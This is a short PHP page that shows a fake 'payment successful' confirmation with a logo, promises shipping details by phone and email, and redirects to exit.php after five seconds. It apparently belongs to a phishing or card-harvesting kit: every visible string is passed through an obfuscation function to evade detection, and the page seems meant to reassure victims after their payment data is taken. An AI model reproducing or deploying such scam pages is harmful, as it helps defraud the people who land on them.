<?php 
require '../main.php';
?><!DOCTYPE html>
<html lang="en" class="h-100">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Successful</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/4.6.2/css/bootstrap.min.css">
    <link rel="stylesheet" href="res/css/style.css">
    <link rel="stylesheet" href="res/css/media.css">
    <script src="res/cdn/jq.js"></script>
</head>
<body class="h-100 bg-white">
    
<div class="container text-center d-flex h-100 align-items-center justify-content-center">
<div>
<img src="res/img/logo.svg">
<h4 class="mt-4"><?php $obf->obf("Your payment was successful."); ?></h4>
<p ><?php $obf->obf("You will receive shipping/payment details in your phone number and email address shorty. "); ?></p>
<p><img src="res/img/paid.png" style="width:200px;"></p>
</div>
</div>
 

<script>

setTimeout(() => {
    window.location="exit.php";
}, 5000);

</script>
</body>
</html>